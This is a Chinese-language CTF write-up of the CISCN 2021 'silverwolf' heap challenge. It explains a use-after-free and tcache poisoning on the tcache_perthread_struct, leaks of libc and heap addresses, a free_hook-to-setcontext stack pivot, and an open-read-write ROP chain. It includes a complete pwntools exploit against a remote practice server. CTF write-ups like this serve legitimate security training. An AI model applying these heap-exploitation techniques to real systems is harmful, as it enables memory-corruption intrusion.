---
title: NSSCTF-CISCN-2021-silverwolf 题解
date: 2026-02-26 20:41:00
tags: 
    - UAF
    - heap
    - tcache poisoning
    - srop
    - 栈迁移
    - orw
    - pwn
    - NSSCTF
categories: NSSCTF 题解
---
### 题目

[题目链接](https://www.nssctf.cn/problem/912)

### checksec

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/CISCN-2021-silverwolf/checksec.png)

全开

### IDA

#### main

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/CISCN-2021-silverwolf/main.png)

菜单题

#### initbuf

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/CISCN-2021-silverwolf/initbuf.png)

有沙箱，需要 orw

#### allocate

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/CISCN-2021-silverwolf/allocate.png)

同一时间只能掌控一个 chunk ，最大为 0x78

#### edit

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/CISCN-2021-silverwolf/edit.png)

#### show

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/CISCN-2021-silverwolf/show.png)

用于 leak

#### delete

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/CISCN-2021-silverwolf/delete.png)

有 UAF

### 攻击思路

挺棘手的，这道题目没有任何 leak pie 和 leak stack 的手段，只能 leak libc 和 leak heap

利用 UAF 和 tcache 机制我们可以轻松 leak heap ，并把 tcache_pthread_struct 扔进 unsorted_bin 以 leak libc ，同时还可以保留 tcache_pthread_struct 的写入权限

劫持到 tcache_pthread_struct 后有一个好处： 我们获得了 tcache_entries 的控制权，这意味着我们可以轻松指定下一次指定大小的 chunk 的分配地址，这有利于我们布置 rop 链以及接下来的 setcontext 技巧

由于我们没办法直接劫持程序流程，而且要实现 orw 的话直接劫持 free_hook 不够（参数个数原因），因此我们考虑栈迁移并构造 rop 链

我们将栈迁移的目标设置在堆上，而要实现栈迁移，我们可以将 free_hook 劫持为 setcontext + 0x35 ，传入的 rdi 为寄存器布局的地址，即可实现类似 srop 的效果

#### setcontext

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/CISCN-2021-silverwolf/setcontext.png)

这里第一个 rcx 即 rip

接下来我使用了一点小巧思：我们不直接写入 orw 的 rop 链，因为这样太长，需要分段写入，所以我们可以先调用 read syscall 在 rsp 的目标地址一次性写入 rop 链

因此我们需要操纵的寄存器有

```
rax = 0
rdi = 0
rsi = heap_addr + rop_offset
rdx = 0x400
rsp = heap_addr + rop_offset
rip = syscall_ret_addr
```

然后在新获得的写入机会中写入完整的 orw 攻击链即可拿到 flag

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

debug = 0

if debug:
	io = process('./silverwolf_patched')
else:
	io = remote('node4.anna.nssctf.cn', 22853)

def allocate(size):
	io.sendlineafter(b'Your choice: ', b'1')
	io.sendlineafter(b'Index: ', b'0')
	io.sendlineafter(b'Size: ', str(size).encode())

def edit(content):
	io.sendlineafter(b'Your choice: ', b'2')
	io.sendlineafter(b'Index: ', b'0')
	io.sendlineafter(b'Content: ', content)

def show():
	io.sendlineafter(b'Your choice: ', b'3')
	io.sendlineafter(b'Index: ', b'0')

def delete():
	io.sendlineafter(b'Your choice: ', b'4')
	io.sendlineafter(b'Index: ', b'0')

def exit():
	io.sendlineafter(b'Your choice: ', b'5')

def attack():
	allocate(0x78)
	delete()
	show()
	io.recvuntil(b'Content: ')
	heap_base = u64(io.recv(6).ljust(8, b'\x00')) - 0x11b0
	log.info(f'heap_base = {hex(heap_base)}')

	edit(p64(heap_base + 0x10) + p64(0))
	allocate(0x78)
	allocate(0x78)
	edit((p8(0) * 35 + p8(7)).ljust(0x40 - 1, p8(0)))
	delete()
	show()
	io.recvuntil(b'Content: ')
	libc_base = u64(io.recv(6).ljust(8, b'\x00')) - 0x3ebca0
	log.info(f'libc_base = {hex(libc_base)}')
	
	free_hook = 0x3ed8e8 + libc_base
	setcontext = 0x521b5 + libc_base
	xor_rax_ret = 0xb15a5 + libc_base
	pop_rdx_pop_rsi_ret = 0x130569 + libc_base
	syscall_ret = 0xd2745 + libc_base
	pop_rax_ret = 0x43ae8 + libc_base
	pop_rdi_ret = 0x215bf + libc_base
	stack_pivoting0 = 0x10000 + heap_base
	stack_pivoting1 = 0x10000 + heap_base + 0x70
	stack_pivoting2 = 0x10000 + heap_base + 0xa0
	edit(p8(0) * 0x40 + p64(free_hook - 0x8) + p64(stack_pivoting2) + p64(stack_pivoting1) + p64(stack_pivoting0))
	allocate(0x18)
	edit(b'/flag\x00\x00\x00' + p64(setcontext))
	log.info(f'free_hook_addr = {hex(free_hook)}')
	log.info(f'set_context_addr = {hex(setcontext)}')
	
	allocate(0x28)
	srop2 = flat([
		p64(heap_base + 0x58), 
		p64(syscall_ret)])
	edit(srop2)

	allocate(0x38)
	srop1 = flat([
		p64(heap_base + 0x58), 
		p64(0) * 2, 
		p64(0x400)])
	edit(srop1)

	allocate(0x48)
	delete()

	orw = flat([
		p64(pop_rdi_ret), 
		p64(free_hook - 0x08), 
		p64(pop_rdx_pop_rsi_ret), 
		p64(0), 
		p64(0), 
		p64(pop_rax_ret), 
		p64(2), 
		p64(syscall_ret), 
		p64(pop_rdi_ret), 
		p64(3), 
		p64(pop_rdx_pop_rsi_ret), 
		p64(0x100), 
		p64(heap_base + 0x300), 
		p64(xor_rax_ret), 
		p64(syscall_ret), 
		p64(pop_rdi_ret), 
		p64(1), 
		p64(pop_rdx_pop_rsi_ret), 
		p64(0x100), 
		p64(heap_base + 0x300), 
		p64(pop_rax_ret), 
		p64(1), 
		p64(syscall_ret)])
	io.send(orw)

	io.interactive()

attack()
```